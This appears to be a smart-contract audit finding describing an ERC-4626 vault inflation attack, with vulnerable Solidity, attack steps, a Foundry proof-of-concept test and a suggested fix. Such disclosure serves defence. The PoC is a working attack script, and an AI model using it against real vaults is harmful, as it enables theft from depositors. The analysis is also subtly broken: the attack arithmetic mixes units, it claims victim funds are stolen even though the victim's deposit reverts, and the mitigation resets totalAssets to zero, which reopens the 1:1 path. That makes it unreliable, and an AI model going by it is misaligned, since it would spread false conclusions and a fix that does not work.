## Finding 1: ERC-4626 Inflation Attack — Missing Dead Shares

**Severity**: 🟠 HIGH | **Pattern**: #5 — Deposit Donation Inflation

#### Description
`Vault.deposit()` uses a 1:1 asset-to-share ratio for the first depositor. An attacker can front-run the first deposit with 1 wei, directly transfer tokens to inflate `totalAssets`, and lock the vault — preventing all subsequent depositors from receiving shares.

#### Vulnerable Code
```solidity
// Vault.sol:150
function deposit(uint256 assets, address receiver) external returns (uint256 shares) {
    shares = convertToShares(assets);  // ← uses manipulable ratio
    
    _transferAssetIn(msg.sender, assets);
    _mint(receiver, shares);
}

// ShareMath.sol:15
function convertToShares(uint256 assets, ...) internal view returns (uint256) {
    if (totalSupply == 0 || totalAssets == 0) {
        return assets; // ⚠️ 1:1 — no inflation protection
    }
    return (assets * totalSupply) / totalAssets; // ⚠️ integer division
}
```

#### Impact
1. Attacker: `deposit(1 wei)` → 1 share, totalSupply=1, totalAssets=1
2. Attacker: `token.transfer(vault, 1000e18)` → totalAssets=1001, shares unchanged
3. Victim: `deposit(1000e18)` → shares = 1000e18 × 1 / 1001 = 0 → **REVERT**
4. Attacker: `redeem(1)` → 1 × 1001 / 1 = 1001 tokens — **steals everything**

**Affected Funds**: All pool funds | **Likelihood**: HIGH
**Reference**: ERC-4626 EIP section on inflation attacks

#### PoC
```solidity
function testInflation() public {
    // Attacker deposits 1 wei
    vm.prank(attacker);
    vault.deposit(1, attacker);
    
    // Attacker donates directly (bypassing deposit)
    deal(address(token), attacker, 1000e18);
    vm.prank(attacker);
    token.transfer(address(vault), 1000e18);
    
    // Victim can't deposit — gets 0 shares
    vm.prank(victim);
    vm.expectRevert(ZeroAmount.selector);
    vault.deposit(1000e18, victim);
    
    // Attacker redeems and gets everything
    vm.prank(attacker);
    vault.redeem(1, attacker, attacker);
    assertGt(token.balanceOf(attacker), 1000e18);
}
```

#### Recommended Mitigation
```solidity
uint256 constant DEAD_SHARES = 1000;
constructor() {
    _mint(address(0), DEAD_SHARES); // Permanent dead shares
    totalAssets = 0; // Reset after mint
}
```
